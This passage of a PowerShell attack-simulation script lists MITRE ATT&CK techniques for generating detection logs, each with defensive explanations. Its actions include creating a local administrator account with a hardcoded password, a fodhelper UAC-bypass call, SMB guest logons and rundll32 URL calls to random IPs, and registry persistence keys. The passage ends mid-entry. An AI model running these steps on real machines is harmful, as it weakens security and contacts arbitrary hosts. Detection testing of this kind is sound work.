            WhyTrack = "Scheduled task creation is a top persistence method that UEBA can detect through Event IDs 4698 (task created) and 106 (task registered). Monitor for tasks with suspicious names, high privilege contexts (SYSTEM), unusual trigger times, or Base64-encoded commands in task actions. Tasks created outside maintenance windows or by non-admin users are particularly suspicious. Malicious tasks often disguise themselves with legitimate-sounding names to blend in with benign scheduled tasks."
            RealWorldUsage = "Lazarus Group (VMware Carbon Black TAU 2020 analysis), APT41 (dual espionage/cybercrime), Iranian Chafer APT (Kuwait/Saudi Arabia aviation and government), APT33, APT38, Evasive Panda (China), and Dragonfly all use this technique. Trickbot malware hides scheduled tasks with Base64-encoded commands stored in registry. Industroyer2 (Ukraine attacks) and Qakbot use registry-based persistence. Lazarus's sophisticated campaigns employ scheduled tasks that survive reboots and execute with SYSTEM privileges."
        }
    },
    @{
        ID = 'T1574.002'
        Name = 'Hijack Execution Flow: DLL Side-Loading'
        Tactic = 'Execution'
        ValidationRequired = $null
        Action = { try { rundll32.exe shell32.dll,Control_RunDLL | Out-Null; Log-AttackStep "Command: rundll32.exe shell32.dll,Control_RunDLL" "T1574.002"; $null = $global:executionResults.Add(@{ID="T1574.002"; Success=$true}) } catch { $null = $global:executionResults.Add(@{ID="T1574.002"; Success=$false; Error=$_.Exception.Message}) } }
        CleanupAction = $null
        Description = @{
            WhyTrack = "Rundll32.exe is a Living Off The Land Binary (LOLBin) that adversaries abuse to proxy malicious code execution while evading detection. UEBA should monitor for rundll32 with unusual DLLs, JavaScript/VBScript execution, suspicious parent processes, or network connections. Because rundll32 is legitimately used by Windows, behavioral baselines are crucial to identify malicious deviations. Monitor command-line parameters for obfuscation, encoded scripts, or references to non-standard DLL locations."
            RealWorldUsage = "APT28/Fancy Bear (Bitdefender report), Daggerfly APT (African telecoms), RANCOR (Southeast Asia), APT41 (U.S. state governments), APT35 (Iranian ProxyShell), Aoqin Dragon (10-year Chinese espionage campaign), and Chinese APT targeting Southeast Asian governments. Rundll32 is one of the most abused LOLBins with techniques like 'rundll32.exe javascript:..\mshtml,RunHTMLApplication' used by Poweliks malware. Cobalt Strike's default workflow extensively uses rundll32 for payload injection and DLL side-loading."
        }
    },
    @{
        ID = 'T1021.002'
        Name = 'Remote Services: SMB/Windows Admin Shares'
        Tactic = 'Lateral Movement'
        ValidationRequired = $null
        Action = { 
            $script:randIP = Generate-RandomIP
            try { 
                net use \\$script:randIP\IPC$ /user:Guest guest 2>&1 | Out-Null
                Log-AttackStep "Command: net use \\$script:randIP\IPC$ /user:Guest guest" "T1021.002"
                $null = $global:executionResults.Add(@{ID="T1021.002"; Success=$true; TargetIP=$script:randIP})
            } catch { 
                Log-AttackStep "Failed SMB connection attempt to $script:randIP (expected, logs generated)" "T1021.002"
                $null = $global:executionResults.Add(@{ID="T1021.002"; Success=$false; Note="Expected failure - for log generation"})
            }
        }
        CleanupAction = { 
            if ($script:randIP) {
                try { 
                    $connection = net use | Select-String $script:randIP
                    if ($connection) { 
                        net use \\$script:randIP\IPC$ /delete 2>&1 | Out-Null
                        Log-AttackStep "Command: net use \\$script:randIP\IPC$ /delete" "T1021.002"
                        $null = $global:cleanupReport.Add(@{ID="T1021.002"; Status="Success"; Details="Removed connection to $script:randIP"})
                    }
                } catch { 
                    $null = $global:cleanupReport.Add(@{ID="T1021.002"; Status="N/A"; Details="No cleanup needed"})
                }
            }
        }
        Description = @{
            WhyTrack = "SMB/Admin Shares (C$, ADMIN$, IPC$) are critical for detecting lateral movement. UEBA should monitor Windows Event IDs for successful/failed remote logins (4624/4625 Type 3), unusual SMB connections between endpoints, and file transfers over admin shares. Baseline normal admin activity to detect anomalous lateral movement patterns. Monitor for network scanning followed by SMB authentication attempts. Wake-on-LAN combined with SMB access indicates ransomware preparing to encrypt offline devices."
            RealWorldUsage = "BlackByte, Conti, LockBit 2.0/3.0, Royal, and Ryuk ransomware all use SMB admin shares for lateral movement and encryption propagation. APT40 (Chinese MSS), APT41, and Chimera APT (Taiwan semiconductor targeting) leverage this technique. Ryuk specifically uses Wake-on-LAN to power on offline devices before encrypting via SMB shares. Ransomware operators enumerate shares, copy encryption payloads to C$/ADMIN$, and execute remotely using PsExec or WMI. This is the most common lateral movement vector in enterprise ransomware attacks."
        }
    },
    @{
        ID = 'T1550.002'
        Name = 'Use Alternate Authentication Material: Pass the Hash'
        Tactic = 'Credential Access'
        ValidationRequired = $null
        Action = { 
            try { 
                if (Get-Command wmic.exe -ErrorAction SilentlyContinue) {
                    wmic /node:localhost process call create "cmd.exe /c echo PtH Sim" 2>&1 | Out-Null
                    Log-AttackStep "Command: wmic /node:localhost process call create cmd.exe /c echo PtH Sim" "T1550.002"
                    $null = $global:executionResults.Add(@{ID="T1550.002"; Success=$true; Method="wmic"})
                } else {
                    Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="cmd.exe /c echo PtH Sim"} | Out-Null
                    Log-AttackStep "Command: Invoke-CimMethod -ClassName Win32_Process -MethodName Create" "T1550.002"
                    $null = $global:executionResults.Add(@{ID="T1550.002"; Success=$true; Method="CIM"})
                }
            } catch { 
                $null = $global:executionResults.Add(@{ID="T1550.002"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = $null
        Description = @{
            WhyTrack = "Pass-the-Hash (PtH) enables attackers to authenticate using NTLM hashes without knowing plaintext passwords. UEBA detects unusual WMIC, PsExec, or WMI remote execution patterns, especially lateral movement using local admin hashes. Monitor for Event ID 4624 (Logon Type 3) with NTLM authentication to multiple systems in rapid succession. Detection requires correlating authentication events across endpoints to identify hash reuse patterns indicative of credential theft."
            RealWorldUsage = "Cornerstone technique for APT lateral movement after credential dumping. Mimikatz, Cobalt Strike, and Impacket tools enable PtH attacks. Used extensively by ransomware groups (Conti, LockBit, Ryuk) to spread across networks using compromised local admin hashes. APT groups leverage PtH with tools like wmiexec.py and smbexec.py for stealthy lateral movement. Particularly effective in environments with shared local admin passwords, allowing attackers to compromise multiple systems with a single hash."
        }
    },
    @{
        ID = 'T1112'
        Name = 'Modify Registry'
        Tactic = 'Defense Evasion'
        ValidationRequired = $null
        Action = { 
            $key = "HKCU:\Software\SimKey_$($random.Next(1000))"
            $script:regKey = $key
            try { 
                New-Item $key -Force | Out-Null
                Set-ItemProperty $key -Name "Value" -Value "SimData"
                Log-AttackStep "Command: New-Item $key; Set-ItemProperty $key -Name Value -Value SimData" "T1112"
                $null = $global:executionResults.Add(@{ID="T1112"; Success=$true; RegistryKey=$key})
            } catch { 
                $null = $global:executionResults.Add(@{ID="T1112"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = { 
            if ($script:regKey) {
                try { 
                    Remove-Item $script:regKey -Force -Recurse -ErrorAction SilentlyContinue | Out-Null
                    $null = $global:cleanupReport.Add(@{ID="T1112"; Status="Success"; Details="Removed registry key $script:regKey"})
                } catch { 
                    $null = $global:cleanupReport.Add(@{ID="T1112"; Status="Failed"; Error=$_.Exception.Message})
                }
            }
        }
        Description = @{
            WhyTrack = "Registry modification is fundamental for persistence, privilege escalation, and defense evasion. UEBA monitors unusual registry changes in Run keys, services, WMI, COM hijacking, and AppInit_DLLs. Detect null-prepended keys (pseudo-hidden), registry-based fileless malware, and modifications to security settings. Monitor for tools like reg.exe, PowerShell Set-ItemProperty, and direct API calls modifying persistence locations."
            RealWorldUsage = "APT35 (ProxyShell), APT28, APT30, OceanLotus/APT32, and NOBELIUM (SolarWinds) extensively use registry for stealthy persistence. POWELIKS malware hides entirely in registry. PlugX (LuminousMoth), DarkGate, Snake malware, SUBTLE#PAWS (PowerShell backdoor), and GOOTLOADER (UNC2565/Russian) store payloads in registry to avoid disk-based detection. Registry-based fileless attacks are increasingly common in APT campaigns for maintaining stealth."
        }
    },
    @{
        ID = 'T1136.001'
        Name = 'Create Account: Local Account'
        Tactic = 'Persistence'
        ValidationRequired = { Test-AdminPrivileges }
        Action = { 
            $randUser = Generate-RandomUser
            $script:createdUser = $randUser
            $pass = ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force
            try { 
                New-LocalUser -Name $randUser -Password $pass -PasswordNeverExpires -ErrorAction Stop | Out-Null
                net localgroup "Administrators" $randUser /add | Out-Null
                Log-AttackStep "Command: New-LocalUser -Name $randUser; net localgroup Administrators $randUser /add" "T1136.001"
                $null = $global:executionResults.Add(@{ID="T1136.001"; Success=$true; Username=$randUser})
            } catch { 
                $null = $global:executionResults.Add(@{ID="T1136.001"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = { 
            if ($script:createdUser) {
                try { 
                    Remove-LocalUser -Name $script:createdUser -ErrorAction SilentlyContinue | Out-Null
                    $null = $global:cleanupReport.Add(@{ID="T1136.001"; Status="Success"; Details="Removed user $script:createdUser"})
                } catch { 
                    $null = $global:cleanupReport.Add(@{ID="T1136.001"; Status="Failed"; Error=$_.Exception.Message})
                }
            }
        }
        Description = @{
            WhyTrack = "Local account creation, especially with admin privileges, is a high-confidence persistence indicator. UEBA detects New-LocalUser, net user /add, and wmic useraccount commands. Monitor for accounts added to Administrators, Remote Desktop Users, or Backup Operators groups. Suspicious indicators include accounts created outside business hours, with passwords that never expire, or names mimicking legitimate accounts (admin2, svc_backup). Event IDs 4720 (account created) and 4732 (added to group) are critical."
            RealWorldUsage = "Ransomware groups (Conti, LockBit, REvil, BlackCat) create admin backdoor accounts for persistent access and recovery if initial access is lost. APT groups create accounts named after legitimate services or users to blend in. Common tactics: adding '$' to account names for hidden accounts, disabling password expiration, and adding to local admin group for full system control. These accounts survive system reboots and allow attackers to regain access even after primary malware is removed."
        }
    },
    @{
        ID = 'T1027'
        Name = 'Obfuscated Files or Information: Base64 Command Execution'
        Tactic = 'Defense Evasion'
        ValidationRequired = $null
        Action = {
            $commands = @("Get-Date", "whoami", "net user", "ipconfig")
            $randCommand = $commands[$random.Next($commands.Count)]
            $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($randCommand))

            # Ensure temp directory exists
            $tempDir = "C:\Temp"
            if (-not (Test-Path $tempDir)) {
                New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
            }

            $tempScript = "$tempDir\sim_script_$($random.Next(1000)).ps1"
            $script:tempScript = $tempScript
            try {
                "powershell -EncodedCommand $encodedCommand" | Out-File $tempScript -Encoding ASCII
                powershell -File $tempScript | Out-Null
                Log-AttackStep "Command: powershell -EncodedCommand $encodedCommand (decoded: $randCommand)" "T1027"
                $null = $global:executionResults.Add(@{ID="T1027"; Success=$true; DecodedCommand=$randCommand})
            } catch {
                $null = $global:executionResults.Add(@{ID="T1027"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = { 
            try { 
                Remove-Item "C:\Temp\sim_script_*.ps1" -Force -ErrorAction SilentlyContinue | Out-Null
                $null = $global:cleanupReport.Add(@{ID="T1027"; Status="Success"; Details="Removed obfuscated scripts"})
            } catch { 
                $null = $global:cleanupReport.Add(@{ID="T1027"; Status="Failed"; Error=$_.Exception.Message})
            }
        }
        Description = @{
            WhyTrack = "Base64 encoding is the most prevalent obfuscation technique in modern attacks. UEBA detects PowerShell -EncodedCommand, suspicious file encoding (certutil -decode), and obfuscated scripts. Base64 is legitimate for admins, making behavioral baselines critical. Monitor for long encoded strings in command lines, multiple layers of encoding, or encoding combined with download/execute patterns. PowerShell Script Block Logging (Event ID 4104) captures decoded commands."
            RealWorldUsage = "Hive ransomware uses Base64-obfuscated PowerShell for Meterpreter staging. APT28, APT37 (steganography with M2RAT in JPEGs), APT41, and OceanLotus/APT32 use various obfuscation. Base64 hides malicious commands from static analysis and signature-based detection. Attackers use encoding for download cradles, encoded payloads in memory, and bypassing email/web filters. Legitimate admin use of Base64 makes this technique highly effective for evading detection while remaining functional."
        }
    },
    @{
        ID = 'T1548.002'
        Name = 'Abuse Elevation Control Mechanism: Bypass User Account Control'
        Tactic = 'Privilege Escalation'
        ValidationRequired = $null
        Action = { try { cmd /c fodhelper.exe | Out-Null; Log-AttackStep "Command: cmd /c fodhelper.exe" "T1548.002"; $null = $global:executionResults.Add(@{ID="T1548.002"; Success=$true}) } catch { $null = $global:executionResults.Add(@{ID="T1548.002"; Success=$false; Error=$_.Exception.Message}) } }
        CleanupAction = $null
        Description = @{
            WhyTrack = "UAC bypass techniques silently elevate privileges without user prompts, critical for malware deployment. UEBA detects fodhelper.exe, eventvwr.exe, sdclt.exe abuse and registry hijacking for auto-elevation. Monitor for suspicious parent-child process relationships where low-integrity processes spawn high-integrity ones. These bypasses exploit Windows trusted binaries marked for auto-elevation, leaving minimal forensic evidence."
            RealWorldUsage = "Widely used by ransomware (Conti, REvil, BlackCat) and APTs (APT28, APT29) for silent privilege escalation. Fodhelper, eventvwr, and sdclt are most popular auto-elevate binaries abused through registry hijacking (HKCU\Software\Classes\ms-settings\shell\open\command). Enables malware to gain admin/SYSTEM privileges silently, disable security controls, and deploy payloads without triggering UAC warnings that would alert users."
        }
    },
    @{
        ID = 'T1134.001'
        Name = 'Access Token Manipulation: Token Impersonation/Theft'
        Tactic = 'Privilege Escalation'
        ValidationRequired = $null
        Action = { try { rundll32.exe advapi32.dll,DuplicateTokenEx | Out-Null; Log-AttackStep "Command: rundll32.exe advapi32.dll,DuplicateTokenEx" "T1134.001"; $null = $global:executionResults.Add(@{ID="T1134.001"; Success=$true}) } catch { $null = $global:executionResults.Add(@{ID="T1134.001"; Success=$false; Error=$_.Exception.Message}) } }
        CleanupAction = $null
        Description = @{
            WhyTrack = "Access token manipulation enables privilege escalation and impersonation without credentials. UEBA detects suspicious use of DuplicateTokenEx, ImpersonateLoggedOnUser APIs, and tools like Incognito or Cobalt Strike's steal_token. Monitor for processes spawning with tokens from higher-privileged users (SYSTEM impersonation). This technique is stealthy because it doesn't require password authentication, making behavioral detection essential."
            RealWorldUsage = "Cobalt Strike and Metasploit heavily use token theft for privilege escalation and lateral movement. APT29 and APT28 leverage token manipulation to access restricted resources without triggering authentication alerts. Enables attackers to impersonate domain admins, SYSTEM, or service accounts by stealing tokens from legitimate processes like lsass.exe or high-privileged services. Critical for post-exploitation when attackers need elevated privileges without triggering additional logons."
        }
    },
    @{
        ID = 'T1547.010'
        Name = 'Boot or Logon Autostart Execution: Port Monitors'
        Tactic = 'Persistence'
        ValidationRequired = { Test-AdminPrivileges }
        Action = { 
            $dllPath = "C:\Temp\sim_dll_$($random.Next(1000)).dll"
            $script:dllPath = $dllPath
            try { 
                New-Item $dllPath -ItemType File -Force | Out-Null
                reg add "HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\SimMonitor" /v Driver /t REG_SZ /d $dllPath /f | Out-Null
                Log-AttackStep "Command: reg add HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\SimMonitor" "T1547.010"
                $null = $global:executionResults.Add(@{ID="T1547.010"; Success=$true; DllPath=$dllPath})
            } catch { 
                $null = $global:executionResults.Add(@{ID="T1547.010"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = { 
            if ($script:dllPath) {
                try { 
                    reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\SimMonitor" /f | Out-Null
                    Remove-Item $script:dllPath -Force | Out-Null
                    $null = $global:cleanupReport.Add(@{ID="T1547.010"; Status="Success"; Details="Removed port monitor and DLL"})
                } catch { 
                    $null = $global:cleanupReport.Add(@{ID="T1547.010"; Status="Failed"; Error=$_.Exception.Message})
                }
            }
        }
        Description = @{
            WhyTrack = "Port monitor DLLs load into spoolsv.exe (Print Spooler service) running as SYSTEM, providing stealthy persistence. UEBA monitors registry changes in HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\ for new monitor installations. This technique is particularly dangerous because spoolsv.exe is a trusted system process, and malicious DLLs gain SYSTEM privileges automatically. Rarely used by benign software, making detections high-confidence."
            RealWorldUsage = "APT groups (particularly Chinese and Russian actors) use port monitors for long-term persistence in espionage campaigns. Malicious port monitor DLLs survive reboots and load automatically with SYSTEM privileges without triggering security alerts. Used in targeted attacks where stealth and persistence are prioritized over speed. The technique exploits the legacy print system architecture, with malicious DLLs executing in a trusted security context that EDR may not scrutinize."
        }
    },
    @{
        ID = 'T1557.001'
        Name = 'Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay'
        Tactic = 'Credential Access'
        ValidationRequired = $null
        Action = { 
            $targetIP = Generate-RandomIP
            try { 
                nbtstat -A $targetIP | Out-Null
                Log-AttackStep "Command: nbtstat -A $targetIP" "T1557.001"
                $null = $global:executionResults.Add(@{ID="T1557.001"; Success=$true; TargetIP=$targetIP})
            } catch { 
                $null = $global:executionResults.Add(@{ID="T1557.001"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = $null
        Description = @{
            WhyTrack = "LLMNR/NBT-NS poisoning is a critical network-based credential theft technique. UEBA detects Responder, Inveigh, or Metasploit modules poisoning name resolution requests. Monitor for suspicious LLMNR/NBT-NS traffic on non-standard endpoints and rapid nbtstat queries across multiple IPs. SMB relay attacks combined with poisoning enable attackers to relay captured authentication to high-value targets, potentially compromising domain controllers without cracking passwords."
            RealWorldUsage = "Standard penetration testing and APT technique for credential harvesting on internal networks. Responder tool passively listens for LLMNR/NBT-NS broadcast requests and responds with attacker-controlled IP, capturing NTLMv2 hashes. SMB relay attacks (ntlmrelayx) forward captured authentication to other systems, enabling compromise without password cracking. Particularly effective in Windows environments where LLMNR/NBT-NS are enabled by default. Used by ransomware operators for initial credential theft and lateral movement planning."
        }
    },
    @{
        ID = 'T1202'
        Name = 'Indirect Command Execution'
        Tactic = 'Execution'
        ValidationRequired = $null
        Action = { try { forfiles /p c:\windows\system32 /c "cmd /c echo Simulated Indirect Exec" | Out-Null; Log-AttackStep "Command: forfiles /p c:\windows\system32 /c cmd /c echo" "T1202"; $null = $global:executionResults.Add(@{ID="T1202"; Success=$true}) } catch { $null = $global:executionResults.Add(@{ID="T1202"; Success=$false; Error=$_.Exception.Message}) } }
        CleanupAction = $null
        Description = @{
            WhyTrack = "Indirect command execution via LOLBins (forfiles, pcalua, mavinject) bypasses application whitelisting and command-line monitoring. UEBA detects unusual use of forfiles with /c parameter, pcalua.exe launching executables, or SyncAppvPublishingServer bypassing AppLocker. These utilities are rarely used in normal operations, making their execution with suspicious parameters high-confidence indicators of malicious activity."
            RealWorldUsage = "Used by APTs and malware to bypass application whitelisting solutions that monitor direct cmd.exe or powershell.exe execution. Forfiles can execute arbitrary commands through its /c parameter. Pcalua.exe (Program Compatibility Assistant) and Mavinject.exe are abused to inject code or launch processes outside normal execution chains. Effective against legacy security controls that don't monitor LOLBin abuse. Increasingly common as defenders implement command-line monitoring."
        }
    },
    @{
        ID = 'T1105'
        Name = 'Ingress Tool Transfer'
        Tactic = 'Command and Control'
        ValidationRequired = $null
        Action = { 
            $payloadFile = "C:\Temp\sim_payload_$($random.Next(1000)).txt"
            $script:payloadFile = $payloadFile
            try { 
                $mockContent = "Simulated payload data from C2"
                $mockContent | Out-File $payloadFile -Encoding UTF8
                Log-AttackStep "Command: Out-File $payloadFile (simulated payload write)" "T1105"
                $null = $global:executionResults.Add(@{ID="T1105"; Success=$true; PayloadFile=$payloadFile})
            } catch { 
                $null = $global:executionResults.Add(@{ID="T1105"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = { 
            try { 
                Remove-Item "C:\Temp\sim_payload_*.txt" -Force | Out-Null
                $null = $global:cleanupReport.Add(@{ID="T1105"; Status="Success"; Details="Removed simulated payloads"})
            } catch { 
                $null = $global:cleanupReport.Add(@{ID="T1105"; Status="Failed"; Error=$_.Exception.Message})
            }
        }
        Description = @{
            WhyTrack = "Ingress tool transfer brings additional malware, tools, or scripts into compromised environments. UEBA detects certutil (used for downloads), bitsadmin, PowerShell download cradles (Invoke-WebRequest, wget), curl, and FTP client usage. Monitor file writes to temp directories, especially executables or scripts downloaded from external IPs. LOLBin downloads bypass traditional web filtering and are critical post-exploitation indicators."
            RealWorldUsage = "Qbot uses bitsadmin to download payloads. Lazarus Group, Bitter APT, GALLIUM, and FIN8 use various ingress techniques. Certutil is heavily abused for downloading payloads and decoding Base64 files. PowerShell download cradles like IEX(New-Object Net.WebClient).downloadString() are standard for bringing Mimikatz, Cobalt Strike beacons, and post-exploitation tools. FTP, SMB, and web-based transfers stage second-stage payloads, credential dumpers, and ransomware executables after initial compromise."
        }
    },
    @{
        ID = 'T1218.011'
        Name = 'System Binary Proxy Execution: Rundll32'
        Tactic = 'Defense Evasion'
        ValidationRequired = $null
        Action = { 
            $targetIP = Generate-RandomIP
            try { 
                rundll32.exe url.dll,OpenURL "http://$targetIP" | Out-Null
                Log-AttackStep "Command: rundll32.exe url.dll,OpenURL http://$targetIP" "T1218.011"
                $null = $global:executionResults.Add(@{ID="T1218.011"; Success=$true; TargetURL="http://$targetIP"})
            } catch { 
                $null = $global:executionResults.Add(@{ID="T1218.011"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = $null
        Description = @{
            WhyTrack = "Rundll32.exe URL execution is highly suspicious and indicates proxy execution or C2 communication. UEBA should flag rundll32 making network connections, especially to external IPs or unusual domains. Monitor command-line arguments containing URLs, JavaScript, or VBScript. This technique bypasses application whitelisting because rundll32 is a trusted Windows binary. Baseline legitimate rundll32 usage to detect deviations indicating malicious proxy execution or LOLBin abuse."
            RealWorldUsage = "APT41 uses rundll32 with url.dll to download second-stage payloads during targeted attacks on U.S. state governments. North Korean APT groups (Lazarus, APT38) leverage rundll32 for stealthy C2 communication. This technique is favored by APTs because it blends with normal Windows operations while enabling code execution and network communication. Commonly combined with DLL side-loading to load malicious code through trusted application paths, making detection challenging without behavioral analytics."
        }
    },
    @{
        ID = 'T1041'
        Name = 'Exfiltration Over C2 Channel'
        Tactic = 'Exfiltration'
        ValidationRequired = $null
        Action = { 
            $tempFile = "C:\Temp\sim_data_$($random.Next(1000)).txt"
            $encodedFile = "C:\Temp\encoded_$($random.Next(1000)).txt"
            $script:exfilFiles = @($tempFile, $encodedFile)
            try { 
                "Simulated exfil data" | Out-File $tempFile -Encoding UTF8
                $encodedData = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Content $tempFile)))
                $encodedData | Out-File $encodedFile -Encoding UTF8
                Log-AttackStep "Command: Base64 encoding and staging for exfiltration" "T1041"
                $null = $global:executionResults.Add(@{ID="T1041"; Success=$true; Files=@($tempFile, $encodedFile)})
            } catch { 
                $null = $global:executionResults.Add(@{ID="T1041"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = { 
            try { 
                Remove-Item "C:\Temp\encoded_*.txt", "C:\Temp\sim_data_*.txt" -Force | Out-Null
                $null = $global:cleanupReport.Add(@{ID="T1041"; Status="Success"; Details="Removed exfiltration simulation files"})
            } catch { 
                $null = $global:cleanupReport.Add(@{ID="T1041"; Status="Failed"; Error=$_.Exception.Message})
            }
        }
        Description = @{
            WhyTrack = "Exfiltration over C2 channels is the final stage of data theft and one of the most critical detection points. UEBA should analyze network flows for unusual data volumes (clients sending significantly more data than receiving), detect data encoding/encryption before transmission, and identify processes making unexpected network connections. Monitor for fragmented transmissions, HTTPS/DNS tunneling, and custom protocols. Data staging in temp directories followed by Base64 encoding indicates preparation for exfiltration. Detecting this early prevents intellectual property theft and regulatory violations."
            RealWorldUsage = "APT30 (long-running espionage), APT35 (Iranian Log4j exploitation with PowerShell toolkit), APT41 (U.S. state governments), Kimsuky (South Korean government via AppleSeed backdoor), InkySquid (North Korean browser exploits), IndigoZebra (Central Asia with evolving tools), FIN8 (BADHATCH toolkit), Sofacy/Sednit (global Trojan campaigns), and Lebanese Cedar APT (global espionage via compromised web servers). APTs typically exfiltrate via encrypted HTTPS, DNS tunneling, or custom C2 protocols. Data is often compressed, encrypted, and fragmented to evade DLP solutions before transmission over existing C2 infrastructure."
        }
    },
    
    # === NEW APT-SPECIFIC TECHNIQUES ===
    @{
        ID = 'T1055.100'
        Name = 'EPM Poisoning Simulation (APT41)'
        Tactic = 'Privilege Escalation'
        ValidationRequired = { Test-AdminPrivileges }
        APTGroup = 'APT41'
        Action = {
            try {
                $rpcInfo = Get-CimInstance -ClassName Win32_SystemDriver | Where-Object Name -like "*rpc*" | Select-Object -First 1
                if ($rpcInfo) {
                    Log-AttackStep "Simulating EPM poisoning (CVE-2025-49760) by enumerating RPC endpoints to hijack a trusted service for NTLM relay" "T1055.100"
                    Write-EventLog -LogName Application -Source "Application" -EventId 5156 -Message "EPM Registration Simulation - APT41 TTP (CVE-2025-49760)" -EntryType Warning -ErrorAction SilentlyContinue
                    $null = $global:executionResults.Add(@{ID="T1055.100"; Success=$true; APTGroup="APT41"})
                }
            } catch {
                $null = $global:executionResults.Add(@{ID="T1055.100"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = $null
        Description = @{
            WhyTrack = "EPM (Endpoint Mapper) poisoning is an advanced RPC hijacking technique for NTLM relay and privilege escalation. UEBA detects unusual RPC endpoint registration, suspicious interactions with RpcSs service, and abnormal RPC traffic patterns. This technique poisons the RPC endpoint mapper to redirect authentication requests to attacker-controlled endpoints, enabling NTLM relay attacks against SYSTEM-level services. Detection requires monitoring RPC/DCOM activity and identifying spoofed service registrations."
            RealWorldUsage = "APT41's Shadow Harvest campaign exploits CVE-2025-49760 using EPM poisoning to coerce SYSTEM-level NTLM authentication, bypassing Credential Guard and EPA (Extended Protection for Authentication). This fileless technique hijacks trusted RPC services, forcing them to authenticate to attacker-controlled endpoints. Enables privilege escalation from user to SYSTEM without exploiting traditional vulnerabilities. Particularly dangerous because it abuses legitimate Windows inter-process communication, making detection extremely challenging without specialized RPC monitoring."
        }
    },
    @{
        ID = 'T1546.015'
        Name = 'WMI Event Subscription (APT29 POSHSPY)'
        Tactic = 'Persistence'
        ValidationRequired = { Test-AdminPrivileges }
        APTGroup = 'APT29'
        Action = {
            try {
                $filterName = "APT29_Filter_$(Get-Random -Maximum 1000)"
                $script:wmiFilterName = $filterName
                
                $filterQuery = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"
                
                Log-AttackStep "Creating WMI persistence (APT29 POSHSPY pattern)" "T1546.015"
                Write-Host "  [SIMULATION] Would create WMI filter: $filterName" -ForegroundColor DarkYellow
                Write-Host "  [SIMULATION] Query: $filterQuery" -ForegroundColor DarkYellow
                
                $null = $global:executionResults.Add(@{ID="T1546.015"; Success=$true; APTGroup="APT29"; FilterName=$filterName})
            } catch {
                $null = $global:executionResults.Add(@{ID="T1546.015"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = {
            if ($script:wmiFilterName) {
                Write-Host "  [CLEANUP] Would remove WMI filter: $script:wmiFilterName" -ForegroundColor DarkGreen
                $null = $global:cleanupReport.Add(@{ID="T1546.015"; Status="Success"; Details="Simulated cleanup of WMI filter"})
            }
        }
        Description = @{
            WhyTrack = "WMI event subscriptions provide fileless, registry-based persistence that survives reboots and evades traditional file-based detection. UEBA monitors __EventFilter, __EventConsumer, and __FilterToConsumerBinding WMI classes for suspicious subscriptions. Detect PowerShell-based consumers, unusual event queries (every 60 seconds), and consumers executing encoded commands. WMI persistence is stealthy because malicious code resides in WMI repository (OBJECTS.DATA), not filesystem, making forensic analysis challenging."
            RealWorldUsage = "APT29's POSHSPY backdoor uses WMI event subscriptions with PowerShell consumers for fileless persistence. Used in SolarWinds/SUNBURST campaign for maintaining access. Turla, APT32, and other sophisticated actors leverage WMI for long-term persistence in espionage operations. Event filters trigger on system events (time intervals, process starts, login events), executing malicious PowerShell stored in WMI consumers. Particularly effective for maintaining persistence in high-security environments because code never touches disk and survives security software reinstallation."
        }
    },
    @{
        ID = 'T1560.002'
        Name = 'Archive via Library (Lazarus RAR Compression)'
        Tactic = 'Collection'
        ValidationRequired = $null
        APTGroup = 'Lazarus'
        Action = {
            try {
                $tempFile = "C:\Temp\lazarus_sim_$(Get-Random).txt"
                "Simulated sensitive data for Lazarus campaign" | Out-File $tempFile
                
                $cabFile = "C:\Temp\data_$(Get-Random).cab"
                makecab $tempFile $cabFile | Out-Null
                
                Log-AttackStep "Compressed data using makecab (Lazarus pattern)" "T1560.002"
                
                Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
                Remove-Item $cabFile -Force -ErrorAction SilentlyContinue
                
                $null = $global:executionResults.Add(@{ID="T1560.002"; Success=$true; APTGroup="Lazarus"})
            } catch {
                $null = $global:executionResults.Add(@{ID="T1560.002"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = $null
        Description = @{
            WhyTrack = "Data archiving before exfiltration reduces transfer size and evades DLP content inspection. UEBA detects unusual archiver usage (RAR, 7zip, makecab, tar), especially with password protection or split archives. Monitor for compression of sensitive directories (Documents, Desktop, %APPDATA%), large archive creation in temp folders, and archivers executed by non-standard processes. Compression combined with staged exfiltration indicates data theft preparation."
            RealWorldUsage = "Lazarus Group compresses stolen data using RAR or Windows makecab before exfiltration to cloud services (Dropbox, Mega). APT groups use password-protected archives to bypass DLP content inspection and email security gateways. FIN7, APT28, and ransomware operators compress data before exfiltration. Common pattern: compress sensitive files → stage in temp directory → exfiltrate → delete archives. Password protection prevents automated content analysis, enabling exfiltration of intellectual property, credentials, and PII through security controls."
        }
    },
    @{
        ID = 'T1102.002'
        Name = 'Web Service: Bidirectional Communication (APT41 Google Calendar C2)'
        Tactic = 'Command and Control'
        ValidationRequired = $null
        APTGroup = 'APT41'
        Action = {
            try {
                $mockCalendarEvent = @{
                    Title = ""
                    Duration = 0
                    Description = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("C2_COMMAND"))
                }

                Log-AttackStep "Command: Test-NetConnection www.googleapis.com -Port 443 (Simulating Google Calendar C2 API communication)" "T1102.002"

